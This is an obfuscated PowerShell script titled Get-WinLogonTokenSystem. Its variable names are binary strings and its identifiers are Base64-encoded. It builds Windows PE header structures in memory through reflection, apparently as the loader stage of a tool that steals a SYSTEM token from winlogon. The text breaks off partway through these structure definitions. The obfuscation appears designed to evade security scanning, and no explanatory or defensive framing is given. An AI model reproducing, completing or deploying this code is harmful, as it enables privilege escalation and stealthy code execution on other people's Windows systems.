function Get-WinLogonTokenSystem
{
function _10001011000101101
{
  [CmdletBinding()]
  Param(
    [Parameter(Position = 0, Mandatory = $true)]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    ${_00110111011010011},
    [Parameter(Position = 1)]
    [String[]]
    ${_01100010000000010},
    [Parameter(Position = 2)]
    [ValidateSet( 'WString', 'String', 'Void' )]
    [String]
    ${_10100110010101100} = 'Void',
    [Parameter(Position = 3)]
    [String]
    ${_00000011111101000},
    [Parameter(Position = 4)]
    [Int32]
    ${_00010011110000010},
    [Parameter(Position = 5)]
    [String]
    ${_01101111010001101},
    [Switch]
    ${_01011101011011001},
    [Switch]
    ${_10100010010001100}
  )
  Set-StrictMode -Version 2
  ${10001000011100111} = {
    [CmdletBinding()]
    Param(
      [Parameter(Position = 0, Mandatory = $true)]
      [Byte[]]
      ${_00110111011010011},
      [Parameter(Position = 1, Mandatory = $true)]
      [String]
      ${_10100110010101100},
      [Parameter(Position = 2, Mandatory = $true)]
      [Int32]
      ${_00010011110000010},
      [Parameter(Position = 3, Mandatory = $true)]
      [String]
      ${_01101111010001101},
        [Parameter(Position = 4, Mandatory = $true)]
        [Bool]
        ${_01011101011011001}
    )
    Function _10101011001010101
    {
      $Win32Types = New-Object System.Object
      ${10001000000100110} = [AppDomain]::CurrentDomain
      ${01101110110001101} = New-Object System.Reflection.AssemblyName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB5AG4AYQBtAGkAYwBBAHMAcwBlAG0AYgBsAHkA'))))
      ${00101100101101101} = ${10001000000100110}.DefineDynamicAssembly(${01101110110001101}, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
      ${10100010010101101} = ${00101100101101101}.DefineDynamicModule($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB5AG4AYQBtAGkAYwBNAG8AZAB1AGwAZQA='))), $false)
      ${10111100000010110} = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
      ${00111011010110110} = ${10100010010101101}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGMAaABpAG4AZQBUAHkAcABlAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt16])
      ${00111011010110110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAHQAaQB2AGUA'))), [UInt16] 0) | Out-Null
      ${00111011010110110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQAzADgANgA='))), [UInt16] 0x014c) | Out-Null
      ${00111011010110110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQB0AGEAbgBpAHUAbQA='))), [UInt16] 0x0200) | Out-Null
      ${00111011010110110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eAA2ADQA'))), [UInt16] 0x8664) | Out-Null
      ${01110000010001010} = ${00111011010110110}.CreateType()
      $Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value ${01110000010001010}
      ${00111011010110110} = ${10100010010101101}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGcAaQBjAFQAeQBwAGUA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt16])
      ${00111011010110110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ATwBQAFQASQBPAE4AQQBMAF8ASABEAFIAMwAyAF8ATQBBAEcASQBDAA=='))), [UInt16] 0x10b) | Out-Null
      ${00111011010110110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ATwBQAFQASQBPAE4AQQBMAF8ASABEAFIANgA0AF8ATQBBAEcASQBDAA=='))), [UInt16] 0x20b) | Out-Null
      ${01011110101101000} = ${00111011010110110}.CreateType()
      $Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value ${01011110101101000}
      ${00111011010110110} = ${10100010010101101}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AGIAUwB5AHMAdABlAG0AVAB5AHAAZQA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt16])
      ${00111011010110110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBVAE4ASwBOAE8AVwBOAA=='))), [UInt16] 0) | Out-Null
      ${00111011010110110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBOAEEAVABJAFYARQA='))), [UInt16] 1) | Out-Null
      ${00111011010110110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBXAEkATgBEAE8AVwBTAF8ARwBVAEkA'))), [UInt16] 2) | Out-Null
      ${00111011010110110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBXAEkATgBEAE8AVwBTAF8AQwBVAEkA'))), [UInt16] 3) | Out-Null
      ${00111011010110110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBQAE8AUwBJAFgAXwBDAFUASQA='))), [UInt16] 7) | Out-Null
      ${00111011010110110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBXAEkATgBEAE8AVwBTAF8AQwBFAF8ARwBVAEkA'))), [UInt16] 9) | Out-Null
      ${00111011010110110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBFAEYASQBfAEEAUABQAEwASQBDAEEAVABJAE8ATgA='))), [UInt16] 10) | Out-Null
      ${00111011010110110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBFAEYASQBfAEIATwBPAFQAXwBTAEUAUgBWAEkAQwBFAF8ARABSAEkAVgBFAFIA'))), [UInt16] 11) | Out-Null
      ${00111011010110110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBFAEYASQBfAFIAVQBOAFQASQBNAEUAXwBEAFIASQBWAEUAUgA='))), [UInt16] 12) | Out-Null
      ${00111011010110110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBFAEYASQBfAFIATwBNAA=='))), [UInt16] 13) | Out-Null
      ${00111011010110110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBYAEIATwBYAA=='))), [UInt16] 14) | Out-Null
      ${01001011001001010} = ${00111011010110110}.CreateType()
      $Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value ${01001011001001010}
      ${00111011010110110} = ${10100010010101101}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwAQwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMAVAB5AHAAZQA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt16])
      ${00111011010110110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwAwAA=='))), [UInt16] 0x0001) | Out-Null
      ${00111011010110110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwAxAA=='))), [UInt16] 0x0002) | Out-Null
      ${00111011010110110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwAyAA=='))), [UInt16] 0x0004) | Out-Null
      ${00111011010110110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwAzAA=='))), [UInt16] 0x0008) | Out-Null
      ${00111011010110110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAXwBDAEgAQQBSAEEAQwBUAEUAUgBJAFMAVABJAEMAUwBfAEQAWQBOAEEATQBJAEMAXwBCAEEAUwBFAA=='))), [UInt16] 0x0040) | Out-Null
      ${00111011010110110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAXwBDAEgAQQBSAEEAQwBUAEUAUgBJAFMAVABJAEMAUwBfAEYATwBSAEMARQBfAEkATgBUAEUARwBSAEkAVABZAA=='))), [UInt16] 0x0080) | Out-Null
      ${00111011010110110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAXwBDAEgAQQBSAEEAQwBUAEUAUgBJAFMAVABJAEMAUwBfAE4AWABfAEMATwBNAFAAQQBUAA=='))), [UInt16] 0x0100) | Out-Null
      ${00111011010110110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBOAE8AXwBJAFMATwBMAEEAVABJAE8ATgA='))), [UInt16] 0x0200) | Out-Null
      ${00111011010110110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBOAE8AXwBTAEUASAA='))), [UInt16] 0x0400) | Out-Null
      ${00111011010110110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBOAE8AXwBCAEkATgBEAA=='))), [UInt16] 0x0800) | Out-Null
      ${00111011010110110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwA0AA=='))), [UInt16] 0x1000) | Out-Null
      ${00111011010110110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBXAEQATQBfAEQAUgBJAFYARQBSAA=='))), [UInt16] 0x2000) | Out-Null
      ${00111011010110110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBUAEUAUgBNAEkATgBBAEwAXwBTAEUAUgBWAEUAUgBfAEEAVwBBAFIARQA='))), [UInt16] 0x8000) | Out-Null
      ${00010000000110011} = ${00111011010110110}.CreateType()
      $Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value ${00010000000110011}
      ${10010100001010100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAEUAeABwAGwAaQBjAGkAdABMAGEAeQBvAHUAdAAsACAAUwBlAGEAbABlAGQALAAgAEIAZQBmAG8AcgBlAEYAaQBlAGwAZABJAG4AaQB0AA==')))
      ${00111011010110110} = ${10100010010101101}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABBAFQAQQBfAEQASQBSAEUAQwBUAE8AUgBZAA=='))), ${10010100001010100}, [System.ValueType], 8)
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABBAGQAZAByAGUAcwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(4) | Out-Null
      ${01110100100000010} = ${00111011010110110}.CreateType()
      $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value ${01110100100000010}
      ${10010100001010100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
      ${00111011010110110} = ${10100010010101101}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARgBJAEwARQBfAEgARQBBAEQARQBSAA=='))), ${10010100001010100}, [System.ValueType], 20)
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGMAaABpAG4AZQA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFMAZQBjAHQAaQBvAG4AcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBEAGEAdABlAFMAdABhAG0AcAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwB5AG0AYgBvAGwAVABhAGIAbABlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFMAeQBtAGIAbwBsAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYATwBwAHQAaQBvAG4AYQBsAEgAZQBhAGQAZQByAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00110000001011111} = ${00111011010110110}.CreateType()
      $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value ${00110000001011111}
      ${10010100001010100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAEUAeABwAGwAaQBjAGkAdABMAGEAeQBvAHUAdAAsACAAUwBlAGEAbABlAGQALAAgAEIAZQBmAG8AcgBlAEYAaQBlAGwAZABJAG4AaQB0AA==')))
      ${00111011010110110} = ${10100010010101101}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATwBQAFQASQBPAE4AQQBMAF8ASABFAEEARABFAFIANgA0AA=='))), ${10010100001010100}, [System.ValueType], 240)
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGcAaQBjAA=='))), ${01011110101101000}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAEwAaQBuAGsAZQByAFYAZQByAHMAaQBvAG4A'))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(2) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAEwAaQBuAGsAZQByAFYAZQByAHMAaQBvAG4A'))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(3) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAQwBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(4) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBuAGkAdABpAGEAbABpAHoAZQBkAEQAYQB0AGEA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(8) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAVQBuAGkAbgBpAHQAaQBhAGwAaQB6AGUAZABEAGEAdABhAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(12) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYARQBuAHQAcgB5AFAAbwBpAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(16) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBPAGYAQwBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(20) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAGEAZwBlAEIAYQBzAGUA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(24) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdABpAG8AbgBBAGwAaQBnAG4AbQBlAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(32) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBBAGwAaQBnAG4AbQBlAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(36) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(40) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(42) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAEkAbQBhAGcAZQBWAGUAcgBzAGkAbwBuAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(44) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAEkAbQBhAGcAZQBWAGUAcgBzAGkAbwBuAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(46) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAFMAdQBiAHMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(48) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAFMAdQBiAHMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(50) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AMwAyAFYAZQByAHMAaQBvAG4AVgBhAGwAdQBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(52) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBtAGEAZwBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(56) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAZABlAHIAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(60) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAFMAdQBtAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(64) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AGIAcwB5AHMAdABlAG0A'))), ${01001011001001010}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(68) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwAQwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), ${00010000000110011}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(70) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUwB0AGEAYwBrAFIAZQBzAGUAcgB2AGUA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(72) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUwB0AGEAYwBrAEMAbwBtAG0AaQB0AA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(80) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAcABSAGUAcwBlAHIAdgBlAA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(88) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAcABDAG8AbQBtAGkAdAA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(96) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABlAHIARgBsAGEAZwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(104) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFIAdgBhAEEAbgBkAFMAaQB6AGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(108) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbwByAHQAVABhAGIAbABlAA=='))), ${01110100100000010}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(112) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAbwByAHQAVABhAGIAbABlAA=='))), ${01110100100000010}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(120) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwB1AHIAYwBlAFQAYQBiAGwAZQA='))), ${01110100100000010}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(128) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAZQBwAHQAaQBvAG4AVABhAGIAbABlAA=='))), ${01110100100000010}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(136) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBlAHIAdABpAGYAaQBjAGEAdABlAFQAYQBiAGwAZQA='))), ${01110100100000010}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(144) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBSAGUAbABvAGMAYQB0AGkAbwBuAFQAYQBiAGwAZQA='))), ${01110100100000010}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(152) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA=='))), ${01110100100000010}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(160) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQByAGMAaABpAHQAZQBjAHQAdQByAGUA'))), ${01110100100000010}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(168) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBsAG8AYgBhAGwAUAB0AHIA'))), ${01110100100000010}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(176) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABMAFMAVABhAGIAbABlAA=='))), ${01110100100000010}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(184) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABDAG8AbgBmAGkAZwBUAGEAYgBsAGUA'))), ${01110100100000010}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(192) | Out-Null
